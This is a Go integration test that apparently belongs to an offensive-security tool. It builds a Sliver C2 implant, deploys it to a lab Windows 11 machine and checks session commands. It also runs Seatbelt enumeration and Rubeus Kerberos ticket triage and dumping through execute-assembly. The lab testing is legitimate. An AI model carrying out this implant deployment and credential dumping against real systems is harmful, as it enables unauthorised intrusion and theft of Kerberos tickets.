//go:build integration && sliver

package test

import (
	"encoding/binary"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/praetorian-inc/wftest/c2"
)

func TestSliver(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping C2 test in short mode")
	}

	cfg, err := LoadConfig()
	if err != nil {
		t.Fatalf("loading config: %v", err)
	}
	if !cfg.Sliver.Enabled {
		t.Skip("sliver tests disabled in config")
	}
	if cfg.Sliver.ImplantSource == "" {
		t.Skip("sliver implant_source not configured")
	}
	if !cfg.Remote.Enabled || !labctlAvailable() {
		t.Skip("remote testing not available (labctl or remote.enabled)")
	}

	// Connect to Sliver server via CLI.
	sliverClient, err := c2.NewSliverClient(cfg.Sliver.ClientBinary, cfg.Sliver.OperatorConfig)
	if err != nil {
		t.Fatalf("connecting to Sliver: %v", err)
	}
	defer sliverClient.Close()

	// Build implant with WasmForge.
	t.Log("building Sliver implant...")
	bin := WasmForgeBuild(t, cfg, cfg.Sliver.ImplantSource, BuildOpts{
		GOOS:      "windows",
		GOARCH:    "amd64",
		Win32APIs: true,
	})
	t.Logf("built Sliver implant in %v (%s)", bin.Duration, bin.Path)

	// Deploy to Win11.
	machine := cfg.Remote.Win11.Machine
	remotePath := cfg.Remote.Win11.WorkDir + `\sliver-test.exe`

	labctlKill(t, machine, "sliver-test.exe")
	labctlPush(t, bin.Path, machine, remotePath, true)
	labctlExecBackground(t, machine, remotePath)

	// Wait for beacon check-in.
	t.Log("waiting for Sliver beacon...")
	session, err := sliverClient.WaitForSession("Win11", 90*time.Second)
	if err != nil {
		// Try beacon if session doesn't appear.
		session, err = sliverClient.WaitForBeacon("Win11", 30*time.Second)
		if err != nil {
			t.Fatalf("no beacon/session check-in: %v", err)
		}
	}
	t.Logf("got session: %s (host=%s, user=%s, os=%s, pid=%d)",
		session.ID, session.Hostname, session.Username, session.OS, session.PID)

	// Cleanup on exit.
	t.Cleanup(func() {
		sliverClient.Kill(session.ID)
		labctlKill(t, machine, "sliver-test.exe")
		labctlCleanup(t, "kali")
	})

	// Run command battery as subtests (same session).
	t.Run("whoami", func(t *testing.T) {
		out, err := sliverClient.Whoami(session.ID)
		if err != nil {
			t.Fatalf("whoami: %v", err)
		}
		if out == "" {
			t.Fatal("whoami returned empty string")
		}
		t.Logf("whoami: %s", out)
	})

	t.Run("ps", func(t *testing.T) {
		procs, err := sliverClient.Ps(session.ID)
		if err != nil {
			t.Fatalf("ps: %v", err)
		}
		// Any Windows host has well over 20 processes; require enough to
		// catch silent truncation. (Lipgloss table truncation used to cap
		// us at the first paginator page before the --overflow fix.)
		if len(procs) < 20 {
			t.Fatalf("ps returned only %d processes (expected >=20)", len(procs))
		}
		t.Logf("ps: %d processes parsed", len(procs))
	})

	t.Run("netstat", func(t *testing.T) {
		out, err := sliverClient.Netstat(session.ID)
		if err != nil {
			t.Fatalf("netstat: %v", err)
		}
		if out == "" {
			t.Fatal("netstat returned empty output")
		}
		lines := strings.Split(out, "\n")
		t.Logf("netstat: %d connections", len(lines))
	})

	t.Run("execute", func(t *testing.T) {
		out, err := sliverClient.Execute(session.ID, "hostname", nil)
		if err != nil {
			t.Fatalf("execute hostname: %v", err)
		}
		if out == "" {
			t.Fatal("hostname returned empty output")
		}
		t.Logf("hostname: %s", out)
	})

	t.Run("sysinfo", func(t *testing.T) {
		out, err := sliverClient.Sysinfo(session.ID)
		if err != nil {
			t.Fatalf("info: %v", err)
		}
		if !strings.Contains(out, "Hostname") && !strings.Contains(out, "Username") {
			t.Errorf("info output missing Hostname/Username\noutput: %s",
				truncate(out, 500))
		}
		t.Logf("info: %d bytes", len(out))
	})

	t.Run("getpid", func(t *testing.T) {
		out, err := sliverClient.GetPID(session.ID)
		if err != nil {
			t.Fatalf("getpid: %v", err)
		}
		// getpid output looks like "Pid: 1234"; require at least one digit.
		if !strings.ContainsAny(out, "0123456789") {
			t.Errorf("getpid output has no digits\noutput: %s", truncate(out, 200))
		}
		t.Logf("getpid: %s", out)
	})

	t.Run("ifconfig", func(t *testing.T) {
		out, err := sliverClient.Ifconfig(session.ID)
		if err != nil {
			t.Fatalf("ifconfig: %v", err)
		}
		// Every Windows host has at least a loopback or Ethernet interface;
		// Sliver renders rows with MAC/IP Address headers.
		if !strings.Contains(out, "MAC") && !strings.Contains(out, "IP Address") &&
			!strings.Contains(out, "Loopback") {
			t.Errorf("ifconfig output missing interface markers\noutput: %s",
				truncate(out, 500))
		}
		t.Logf("ifconfig: %d bytes", len(out))
	})

	t.Run("pwd", func(t *testing.T) {
		out, err := sliverClient.Pwd(session.ID)
		if err != nil {
			t.Fatalf("pwd: %v", err)
		}
		// The WasmForge implant runs under WASI and reports paths in
		// WASI form ("/c/...") instead of the Windows form ("C:\..."). Either
		// shape is valid; require at least one to confirm pwd returned
		// something path-like rather than an error string.
		hasWASI := strings.HasPrefix(out, "/c/") || strings.HasPrefix(out, "/C/")
		hasWindows := strings.Contains(out, `:\`)
		if !hasWASI && !hasWindows {
			t.Errorf("pwd output not WASI (/c/) or Windows (X:\\) form\noutput: %s",
				truncate(out, 200))
		}
		t.Logf("pwd: %s", out)
	})

	// ls is intentionally omitted: sliver's ls under a WasmForge implant
	// dispatches through WASI readdirent which currently fails with
	// "I/O error" when targeting a subdirectory the runtime hasn't mounted.
	// Re-enable once WasmForge wires preopens for arbitrary host paths.

	// execute-assembly subtests load a stock GhostPack .NET assembly into a
	// sacrificial process via Sliver → Donut → reflective CLR host. They
	// require a NATIVE .NET build (COR20 header set) — wasmforge-wrapped
	// wf-out/*.exe binaries are native Go-hosts-WASM PEs and will fail with
	// "Output: init failed" when their self-extracting loader can't find
	// itself inside notepad.exe's memory image. Configure
	// cfg.Sliver.Native{Seatbelt,Rubeus}Path to a stock GhostPack binary;
	// leave empty to skip.

	// All cases use Seatbelt's "-group=<name>" syntax. Bare command names
	// (e.g. "OSInfo") survive cobra parsing but don't reach Seatbelt's main
	// args[] when piped through sliver-client → Donut → CLR — sliver appears
	// to strip positional args without a leading dash from the parameter
	// string Donut sets on the AppDomain entry-point. "-group=X" works
	// because the leading dash keeps the token in the parameters.
	seatbeltCases := []struct {
		name string
		args string
		want string // substring expected in the post-cleanup output
	}{
		{"group-user", "-group=user", "==="},
		{"group-system", "-group=system", "==="},
		{"group-misc", "-group=misc", "==="},
		{"group-remote", "-group=remote", "==="},
	}
	for _, tc := range seatbeltCases {
		tc := tc
		t.Run("execute-assembly/seatbelt/"+tc.name, func(t *testing.T) {
			skipIfNotNETAssembly(t, cfg.Sliver.NativeSeatbeltPath, "native_seatbelt_path")
			out, err := sliverClient.ExecuteAssembly(session.ID, cfg.Sliver.NativeSeatbeltPath, tc.args)
			if err != nil {
				t.Fatalf("seatbelt %s: %v", tc.name, err)
			}
			if !strings.Contains(out, tc.want) {
				t.Errorf("seatbelt %s output missing %q\noutput: %s",
					tc.name, tc.want, truncate(out, 500))
			}
			t.Logf("seatbelt %s: %d bytes", tc.name, len(out))
		})
	}

	// Rubeus subtests — network-free verbs only (the implant is sandboxed
	// from outbound LDAP/Kerberos in some labs; asktgt/kerberoast need a DC).
	rubeusCases := []struct {
		name string
		args string
		want string // substring expected (or "" for non-empty check)
	}{
		{"triage", "triage", "Action"},
		{"klist", "klist", "Action"},
		{"dump-nowrap", "dump /nowrap", "Action"},
		{"hash", "hash /password:Password123!", "Action"},
	}
	for _, tc := range rubeusCases {
		tc := tc
		t.Run("execute-assembly/rubeus/"+tc.name, func(t *testing.T) {
			skipIfNotNETAssembly(t, cfg.Sliver.NativeRubeusPath, "native_rubeus_path")
			out, err := sliverClient.ExecuteAssembly(session.ID, cfg.Sliver.NativeRubeusPath, tc.args)
			if err != nil {
				t.Fatalf("rubeus %s: %v", tc.name, err)
			}
			if out == "" {
				t.Fatalf("rubeus %s returned empty output", tc.name)
			}
			if tc.want != "" && !strings.Contains(out, tc.want) {
				t.Errorf("rubeus %s output missing %q\noutput: %s",
					tc.name, tc.want, truncate(out, 500))
			}
			t.Logf("rubeus %s: %d bytes", tc.name, len(out))
		})
	}
}

func truncate(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max] + "..."
}

// skipIfNotNETAssembly checks that path exists on the operator and looks like
// a .NET assembly (COR20 directory size > 0). On miss it t.Skip's with a
// configKey-specific reason so the suite stays green when the operator hasn't
// staged native GhostPack builds.
//
// Layout we read (PE32+ optional header): e_lfanew → "PE\0\0" → 20-byte COFF
// header → 112-byte standard+windows optional header fields → 16×8-byte data
// directory array. Entry 14 is the CLR runtime header. PE32 (magic 0x10b)
// has 96 bytes of optional header before the data directory; PE32+ (0x20b)
// has 112.
func skipIfNotNETAssembly(t *testing.T, path, configKey string) {
	t.Helper()
	if path == "" {
		t.Skipf("%s not configured — set in testconfig.toml to a stock GhostPack .NET build", configKey)
	}
	f, err := os.Open(path)
	if err != nil {
		t.Skipf("%s=%s: cannot open: %v", configKey, path, err)
	}
	defer f.Close()

	buf := make([]byte, 0x400)
	n, err := f.Read(buf)
	if err != nil || n < 0x200 {
		t.Skipf("%s=%s: too small to be a valid PE (%d bytes read)", configKey, path, n)
	}
	buf = buf[:n]

	if buf[0] != 'M' || buf[1] != 'Z' {
		t.Skipf("%s=%s: not a PE file (no MZ header)", configKey, path)
	}
	peOff := int(binary.LittleEndian.Uint32(buf[0x3c:0x40]))
	if peOff+0x18+0x70 >= len(buf) || string(buf[peOff:peOff+4]) != "PE\x00\x00" {
		t.Skipf("%s=%s: malformed PE", configKey, path)
	}
	optOff := peOff + 0x18
	magic := binary.LittleEndian.Uint16(buf[optOff : optOff+2])
	dataDirOff := optOff + 96 // PE32
	if magic == 0x20b {
		dataDirOff = optOff + 112 // PE32+
	}
	cor20Off := dataDirOff + 14*8
	if cor20Off+8 > len(buf) {
		t.Skipf("%s=%s: PE header truncated before COR20 directory", configKey, path)
	}
	cor20Size := binary.LittleEndian.Uint32(buf[cor20Off+4 : cor20Off+8])
	if cor20Size == 0 {
		t.Skipf("%s=%s: not a .NET assembly (COR20 size=0). "+
			"execute-assembly needs a stock GhostPack build, not a wasmforge-wrapped binary.",
			configKey, path)
	}
}
